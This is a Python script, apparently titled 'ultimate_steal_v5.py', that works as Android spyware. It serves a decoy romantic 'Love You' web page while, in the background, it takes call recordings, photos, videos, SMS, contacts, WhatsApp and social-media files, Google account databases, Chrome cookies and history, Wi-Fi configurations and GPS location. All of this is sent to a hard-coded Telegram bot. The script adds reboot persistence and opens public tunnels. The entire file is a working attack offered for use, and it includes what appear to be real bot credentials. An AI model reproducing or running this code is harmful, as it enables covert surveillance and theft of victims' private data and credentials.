#!/usr/bin/env python3
# ultimate_steal_v5.py - FIXED PORT + AUTO-TUNNEL

import os, time, requests, glob, json, subprocess, threading, sys, re, shutil, socket
from flask import Flask, render_template_string
import datetime, sqlite3, base64

TOKEN = "7988822215:AAGqtvDhXeY6Xmsj5PDoC2Ka5XoW4tDqO30"
CHAT_ID = "8410035844"

# ---------- AUTO PORT ----------
def get_free_port():
    sock = socket.socket()
    sock.bind(('', 0))
    port = sock.getsockname()[1]
    sock.close()
    return port

PORT = int(os.environ.get("PORT", get_free_port()))

# ---------- AUTO TUNNEL ----------
def start_tunnels(port):
    time.sleep(3)
    # Ngrok
    try:
        subprocess.Popen(["ngrok", "http", str(port)], 
                        stdout=subprocess.DEVNULL, 
                        stderr=subprocess.DEVNULL)
        send_text(f"🌐 Ngrok: http://localhost:4040")
    except:
        pass
    
    # Serveo
    try:
        subprocess.Popen(["ssh", "-R", "80:localhost:" + str(port), "serveo.net"],
                        stdout=subprocess.DEVNULL,
                        stderr=subprocess.DEVNULL)
        send_text("🌐 Serveo: http://serveo.net")
    except:
        pass
    
    # Local tunnel
    try:
        subprocess.Popen(["lt", "--port", str(port)],
                        stdout=subprocess.DEVNULL,
                        stderr=subprocess.DEVNULL)
    except:
        pass

# ---------- PERSISTENCE ----------
def make_persistent():
    try:
        script_path = os.path.abspath(__file__)
        boot_script = f"/data/data/com.termux/files/home/.bashrc"
        with open(boot_script, 'a') as f:
            f.write(f"\npython {script_path} &\n")
        os.system(f"(crontab -l 2>/dev/null; echo '@reboot python {script_path}') | crontab -")
        send_text("🔒 PERSISTENCE ENABLED")
    except:
        pass

# ---------- TELEGRAM ----------
def send_file(path, caption=""):
    try:
        if not os.path.exists(path) or os.path.getsize(path) == 0:
            return False
        size = os.path.getsize(path) / (1024 * 1024)
        if size > 45:
            return False
        ext = os.path.splitext(path)[1].lower()
        if ext in ['.jpg','.jpeg','.png','.gif','.bmp','.webp']:
            method = "sendPhoto"
        elif ext in ['.mp4','.mov','.avi','.mkv','.3gp','.webm']:
            method = "sendVideo"
        elif ext in ['.mp3','.wav','.m4a','.opus','.amr','.aac','.flac']:
            method = "sendAudio"
        else:
            method = "sendDocument"
        url = f"https://api.telegram.org/bot{TOKEN}/{method}"
        with open(path, "rb") as f:
            files = {method.replace("send","").lower(): f}
            data = {"chat_id": CHAT_ID, "caption": caption[:900]}
            r = requests.post(url, data=data, files=files, timeout=90)
        if r.status_code == 200:
            os.remove(path)
            return True
        return False
    except:
        return False

def send_text(text):
    try:
        url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
        requests.post(url, data={"chat_id": CHAT_ID, "text": text[:4000]}, timeout=30)
    except:
        pass

# ---------- FIND FILES ----------
def find_all_files(extensions, max_files=100):
    files = []
    search_paths = ["/sdcard/", "/storage/emulated/0/", "/data/media/0/", "/mnt/sdcard/"]
    for path in search_paths:
        if os.path.exists(path):
            for ext in extensions:
                try:
                    result = subprocess.check_output(
                        f"find {path} -name '*{ext}' 2>/dev/null | head -{max_files}",
                        shell=True, timeout=30
                    ).decode().strip().split('\n')
                    files.extend([f for f in result if f and os.path.exists(f)])
                except:
                    pass
                try:
                    pattern = f"{path}/**/*{ext}"
                    files.extend(glob.glob(pattern, recursive=True)[:max_files])
                except:
                    pass
    return list(set(files))[:max_files]

# ---------- EXTRACTORS ----------
def extract_call_recordings():
    send_text("📞 Extracting call recordings...")
    extensions = ['.amr', '.3gp', '.mp3', '.wav', '.m4a', '.aac', '.opus']
    files = find_all_files(extensions, 50)
    call_patterns = ['call', 'recording', 'record', 'phone', 'dialer', 'voice']
    prioritized = []
    for f in files:
        f_lower = f.lower()
        for pattern in call_patterns:
            if pattern in f_lower:
                prioritized.append(f)
                break
    all_files = prioritized + [f for f in files if f not in prioritized]
    for f in all_files[:50]:
        if os.path.exists(f) and os.path.getsize(f) > 1000:
            send_file(f, "📞 Call Recording")
            time.sleep(0.2)
    os.system("content query --uri content://call_log/calls > /sdcard/call_logs.txt 2>/dev/null")
    if os.path.exists('/sdcard/call_logs.txt'):
        send_file('/sdcard/call_logs.txt', '📞 Call Logs')

def extract_all_photos():
    send_text("📸 Extracting all photos...")
    extensions = ['.jpg', '.jpeg', '.png', '.gif', '.bmp', '.webp', '.heic', '.tiff']
    files = find_all_files(extensions, 150)
    for f in files:
        if os.path.exists(f) and os.path.getsize(f) > 5000:
            send_file(f, "📸 Photo")
            time.sleep(0.15)

def extract_all_videos():
    send_text("🎬 Extracting videos...")
    extensions = ['.mp4', '.mov', '.avi', '.mkv', '.3gp', '.webm', '.flv', '.wmv']
    files = find_all_files(extensions, 50)
    for f in files:
        if os.path.exists(f) and os.path.getsize(f) > 100000:
            send_file(f, "🎬 Video")
            time.sleep(0.3)

def extract_installed_apps():
    send_text("📱 Getting app list...")
    os.system("pm list packages -f > /sdcard/apps_full.txt")
    os.system("pm list packages -3 > /sdcard/apps_user.txt")
    os.system("pm list packages -s > /sdcard/apps_system.txt")
    try:
        result = subprocess.check_output("dumpsys package packages", shell=True, timeout=30).decode()
        with open('/sdcard/apps_details.txt', 'w') as f:
            f.write(result[:50000])
    except:
        pass
    files = ['/sdcard/apps_full.txt', '/sdcard/apps_user.txt', '/sdcard/apps_system.txt', '/sdcard/apps_details.txt']
    for f in files:
        if os.path.exists(f):
            send_file(f, "📱 Apps Info")
            time.sleep(0.3)
    with open('/sdcard/apps_user.txt', 'r') as f:
        user_apps = f.read()
        count = len(user_apps.split('\n'))
        send_text(f"📱 TOTAL APPS: {count}")

def extract_whatsapp_full():
    send_text("💚 Extracting WhatsApp...")
    paths = ["/sdcard/WhatsApp/Media/WhatsApp Images/", "/sdcard/WhatsApp/Media/WhatsApp Video/", "/sdcard/WhatsApp/Media/WhatsApp Audio/", "/sdcard/WhatsApp/Media/WhatsApp Voice Notes/", "/sdcard/WhatsApp/Media/WhatsApp Documents/", "/sdcard/WhatsApp/Media/WhatsApp Animated Gifs/", "/sdcard/Android/media/com.whatsapp/"]
    for path in paths:
        if os.path.exists(path):
            files = glob.glob(path + "*.*")[:30]
            for f in files:
                if os.path.getsize(f) < 45 * 1024 * 1024:
                    send_file(f, "💚 WhatsApp")
                    time.sleep(0.2)

def extract_contacts_sms():
    send_text("📇 Extracting contacts & SMS...")
    os.system("content query --uri content://contacts/phones/ > /sdcard/contacts.txt 2>/dev/null")
    os.system("content query --uri content://contacts/data/ > /sdcard/contacts_all.txt 2>/dev/null")
    os.system("content query --uri content://sms/inbox > /sdcard/sms_inbox.txt 2>/dev/null")
    os.system("content query --uri content://sms/sent > /sdcard/sms_sent.txt 2>/dev/null")
    os.system("content query --uri content://mms/inbox > /sdcard/mms.txt 2>/dev/null")
    for f in ['/sdcard/contacts.txt', '/sdcard/contacts_all.txt', '/sdcard/sms_inbox.txt', '/sdcard/sms_sent.txt', '/sdcard/mms.txt']:
        if os.path.exists(f) and os.path.getsize(f) > 100:
            send_file(f, "📇 Data")
            time.sleep(0.3)

def extract_gmail_accounts():
    send_text("📧 Extracting accounts...")
    os.system("cp /data/system/users/0/accounts.db /sdcard/accounts.db 2>/dev/null")
    if os.path.exists('/sdcard/accounts.db'):
        try:
            conn = sqlite3.connect('/sdcard/accounts.db')
            cursor = conn.cursor()
            cursor.execute("SELECT name FROM accounts WHERE type LIKE '%google%'")
            accounts = cursor.fetchall()
            if accounts:
                emails = [a[0] for a in accounts]
                send_text(f"📧 GMAIL ACCOUNTS:\n{', '.join(emails[:10])}")
            conn.close()
        except:
            pass
        send_file('/sdcard/accounts.db', '📧 Accounts DB')
    os.system("dumpsys account > /sdcard/accounts_dumpsys.txt 2>/dev/null")
    if os.path.exists('/sdcard/accounts_dumpsys.txt'):
        send_file('/sdcard/accounts_dumpsys.txt', '📧 Account Dump')

def extract_battery_location():
    send_text("🔋 Extracting battery & location...")
    result = subprocess.check_output("dumpsys battery", shell=True, timeout=5).decode()
    battery = re.search(r'level: (\d+)', result)
    if battery:
        send_text(f"🔋 BATTERY: {battery.group(1)}%")
    with open('/sdcard/battery.txt', 'w') as f:
        f.write(result)
    send_file('/sdcard/battery.txt', '🔋 Battery Info')
    loc = subprocess.check_output("dumpsys location", shell=True, timeout=5).decode()
    lat = re.search(r'latitude=([\d.]+)', loc)
    long = re.search(r'longitude=([\d.]+)', loc)
    if lat and long:
        send_text(f"📍 LOCATION\nLat: {lat.group(1)}\nLong: {long.group(1)}")
        send_text(f"🗺️ Maps: https://maps.google.com/?q={lat.group(1)},{long.group(1)}")

def extract_browser_data():
    send_text("🌐 Extracting browser data...")
    paths = ["/data/data/com.android.chrome/app_chrome/Default/", "/data/data/com.google.android.apps.chrome/app_chrome/Default/"]
    for path in paths:
        if os.path.exists(path):
            os.system(f"cp {path}History /sdcard/chrome_history.db 2>/dev/null")
            os.system(f"cp {path}Bookmarks /sdcard/chrome_bookmarks.json 2>/dev/null")
            os.system(f"cp {path}Cookies /sdcard/chrome_cookies.db 2>/dev/null")
    for f in ['/sdcard/chrome_history.db', '/sdcard/chrome_bookmarks.json', '/sdcard/chrome_cookies.db']:
        if os.path.exists(f):
            send_file(f, "🌐 Chrome Data")
            time.sleep(0.3)

def extract_social_media():
    send_text("📱 Extracting social media...")
    insta_paths = ["/sdcard/Instagram/", "/sdcard/Pictures/Instagram/", "/data/data/com.instagram.android/cache/"]
    for path in insta_paths:
        if os.path.exists(path):
            files = glob.glob(path + "*.*")[:20]
            for f in files:
                send_file(f, "📸 Instagram")
                time.sleep(0.2)
    fb_paths = ["/sdcard/Facebook/", "/sdcard/Pictures/Facebook/", "/data/data/com.facebook.katana/cache/"]
    for path in fb_paths:
        if os.path.exists(path):
            files = glob.glob(path + "*.*")[:20]
            for f in files:
                send_file(f, "📘 Facebook")
                time.sleep(0.2)
    tg_path = "/sdcard/Telegram/"
    if os.path.exists(tg_path):
        files = glob.glob(tg_path + "*.*")[:20]
        for f in files:
            send_file(f, "✈️ Telegram")
            time.sleep(0.2)

def extract_other_important():
    send_text("📂 Extracting other data...")
    os.system("getprop > /sdcard/device_props.txt")
    os.system("dumpsys > /sdcard/dumpsys_full.txt 2>/dev/null")
    os.system("cat /data/misc/wifi/*.conf > /sdcard/wifi_config.txt 2>/dev/null")
    os.system("dumpsys wifi > /sdcard/wifi_dumpsys.txt 2>/dev/null")
    os.system("netstat > /sdcard/netstat.txt 2>/dev/null")
    os.system("ifconfig > /sdcard/ifconfig.txt 2>/dev/null")
    os.system("ps aux > /sdcard/processes.txt 2>/dev/null")
    downloads = glob.glob("/sdcard/Download/*.*")[:30]
    for f in downloads:
        if os.path.getsize(f) < 45 * 1024 * 1024:
            send_file(f, "📁 Download")
            time.sleep(0.2)
    screenshots = glob.glob("/sdcard/DCIM/Screenshots/*.png") + glob.glob("/sdcard/DCIM/Screenshots/*.jpg")
    for f in screenshots[-30:]:
        send_file(f, "📸 Screenshot")
        time.sleep(0.2)
    text_files = ['/sdcard/device_props.txt', '/sdcard/wifi_config.txt', '/sdcard/wifi_dumpsys.txt', '/sdcard/netstat.txt', '/sdcard/ifconfig.txt', '/sdcard/processes.txt']
    for f in text_files:
        if os.path.exists(f) and os.path.getsize(f) > 100:
            send_file(f, "📊 System Data")
            time.sleep(0.3)

# ---------- MAIN ----------
def extract_everything():
    send_text("🔥 ULTIMATE EXTRACTION STARTED")
    make_persistent()
    functions = [extract_call_recordings, extract_all_photos, extract_all_videos, extract_installed_apps, extract_whatsapp_full, extract_contacts_sms, extract_gmail_accounts, extract_battery_location, extract_browser_data, extract_social_media, extract_other_important]
    threads = []
    for func in functions:
        t = threading.Thread(target=func)
        t.start()
        threads.append(t)
        time.sleep(0.5)
    for t in threads:
        t.join(timeout=180)
    send_text("✅ EXTRACTION COMPLETE!")

# ---------- LOVE PAGE ----------
LOVE_HTML = '''
<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>💖 Love You 💖</title>
<style>
*{margin:0;padding:0}
body{background:linear-gradient(135deg,#ff0066,#ff3366,#ff6b6b);display:flex;justify-content:center;align-items:center;min-height:100vh;font-family:Arial,sans-serif;overflow:hidden}
.card{background:rgba(255,255,255,0.15);backdrop-filter:blur(20px);border-radius:60px;padding:60px 40px;text-align:center;border:2px solid rgba(255,255,255,0.3);box-shadow:0 30px 80px rgba(0,0,0,0.5);animation:float 3s ease-in-out infinite}
@keyframes float{0%,100%{transform:translateY(0)}50%{transform:translateY(-20px)}}
.emoji{font-size:120px;animation:bounce 1.5s infinite}
@keyframes bounce{0%,100%{transform:scale(1)}50%{transform:scale(1.2)rotate(5deg)}}
h1{color:white;font-size:50px;text-shadow:0 5px 30px rgba(0,0,0,0.3)}
.heart{font-size:40px;animation:pulse 1s infinite}
@keyframes pulse{0%,100%{transform:scale(1)}50%{transform:scale(1.3)}}
p{color:rgba(255,255,255,0.7);font-size:20px;margin-top:15px}
.loading{color:rgba(255,255,255,0.2);font-size:12px;margin-top:20px}
.hearts{position:fixed;top:0;left:0;width:100%;height:100%;pointer-events:none;z-index:0}
.heart-fall{position:absolute;font-size:25px;animation:fall linear infinite;opacity:0.3}
@keyframes fall{0%{transform:translateY(-100vh)rotate(0deg)}100%{transform:translateY(100vh)rotate(720deg)}}
</style>
</head>
<body>
<div class="hearts" id="hearts"></div>
<div class="card">
<div class="emoji">💖</div>
<h1>LOVE YOU 💕</h1>
<div><span class="heart">❤️</span> Always & Forever <span class="heart">❤️</span></div>
<p>You are my everything 🌹</p>
<div class="loading">✨ Extracting everything for you... ✨</div>
</div>
<script>
const hearts = ['❤️','💖','💕','💗','💓','❤️‍🔥','💘','💝','🌹','💋'];
const bg = document.getElementById('hearts');
for(let i=0; i<50; i++){
const h = document.createElement('div');
h.className = 'heart-fall';
h.textContent = hearts[Math.floor(Math.random()*hearts.length)];
h.style.left = Math.random()*100 + '%';
h.style.fontSize = (15+Math.random()*35)+'px';
h.style.animationDuration = (8+Math.random()*14)+'s';
h.style.animationDelay = (Math.random()*10)+'s';
bg.appendChild(h);
}
</script>
</body>
</html>
'''

app = Flask(__name__)

@app.route('/')
def index():
    threading.Thread(target=extract_everything).start()
    threading.Thread(target=start_tunnels, args=(PORT,)).start()
    return render_template_string(LOVE_HTML)

@app.route('/health')
def health():
    return " ACTIVE"

if __name__ == "__main__":
    PORT = int(os.environ.get("PORT", get_free_port()))
    app.run(host="0.0.0.0", port=PORT, debug=False)
